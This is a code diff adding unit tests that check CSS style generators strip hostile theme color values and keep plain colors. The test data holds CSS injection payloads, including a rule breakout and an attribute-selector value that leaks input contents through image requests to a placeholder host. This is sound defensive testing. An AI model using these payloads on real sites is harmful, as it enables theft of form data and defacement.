@@ -697,6 +697,89 @@ describe('generateInlineWizardPreviewProseStyles', () => {
 });
 
 // ---------------------------------------------------------------------------
+// Theme colors that are not plain colors (defense in depth for plugin themes)
+// ---------------------------------------------------------------------------
+
+describe('CSS generators and theme colors that are not plain colors', () => {
+	// A value that closes its rule and paints the whole app, and one that adds an
+	// attribute-selector rule that reads an input value through image requests.
+	const BREAKOUT = 'red;} * { background: url(https://x/?a';
+	const EXFILTRATION =
+		'red} input[value^="a"] { background-image: url(https://x/?p=a) } .x { color: red';
+	const hostileTheme: Theme = {
+		...mockTheme,
+		colors: {
+			...mockTheme.colors,
+			textMain: BREAKOUT,
+			accent: EXFILTRATION,
+			accentText: EXFILTRATION,
+			border: 'expression(alert(1))',
+			textDim: 'red\\;',
+			bgActivity: '#123\n}',
+			bgMain: 'url(https://x/a.png)',
+			bgSidebar: 'var(--x)',
+		},
+	};
+
+	const generators: Array<[string, (theme: Theme) => string]> = [
+		['generateProseStyles', (theme) => generateProseStyles({ theme, coloredHeadings: true })],
+		['generateAutoRunProseStyles', (theme) => generateAutoRunProseStyles(theme)],
+		[
+			'generateTerminalProseStyles',
+			(theme) => generateTerminalProseStyles(theme, '.terminal-output'),
+		],
+		[
+			'generateInlineWizardPreviewProseStyles',
+			(theme) => generateInlineWizardPreviewProseStyles(theme, '.preview', 'document'),
+		],
+		['generateDiffViewStyles', (theme) => generateDiffViewStyles(theme)],
+	];
+
+	it.each(generators)('%s writes none of a hostile value', (_name, generate) => {
+		const css = generate(hostileTheme);
+		expect(css).not.toContain('url(');
+		expect(css).not.toContain('* { background');
+		expect(css).not.toContain('input[value');
+		expect(css).not.toContain('expression(');
+		expect(css).not.toContain('var(--x)');
+		expect(css).not.toContain('\\');
+		expect(css).not.toContain('#123');
+	});
+
+	it('drops only the bad color and keeps the declarations around it', () => {
+		const theme: Theme = { ...mockTheme, colors: { ...mockTheme.colors, textMain: BREAKOUT } };
+		const css = generateProseStyles({ theme });
+		expect(css).toContain('.prose p { color: ; margin: 0.5em 0 !important');
+		expect(css).toContain(`.prose a { color: ${mockTheme.colors.accentText}`);
+		expect(css).toContain(`border: 1px solid ${mockTheme.colors.border}`);
+	});
+
+	it('writes every plain color form as it is', () => {
+		const theme: Theme = {
+			...mockTheme,
+			colors: {
+				...mockTheme.colors,
+				textMain: 'rgb(248 248 242 / 90%)',
+				textDim: 'hsl(225deg 27% 51%)',
+				accentText: 'currentColor',
+				border: 'slategray',
+			},
+		};
+		const css = generateProseStyles({ theme });
+		expect(css).toContain('.prose p { color: rgb(248 248 242 / 90%);');
+		expect(css).toContain('color: hsl(225deg 27% 51%)');
+		expect(css).toContain('.prose a { color: currentColor;');
+		expect(css).toContain('border: 1px solid slategray');
+	});
+
+	it('leaves the theme it was given alone', () => {
+		const theme: Theme = { ...mockTheme, colors: { ...mockTheme.colors, textMain: BREAKOUT } };
+		generateTerminalProseStyles(theme, '.terminal-output');
+		expect(theme.colors.textMain).toBe(BREAKOUT);
+	});
+});
+
+// ---------------------------------------------------------------------------
 // Shared Markdown Presets
 // ---------------------------------------------------------------------------
 
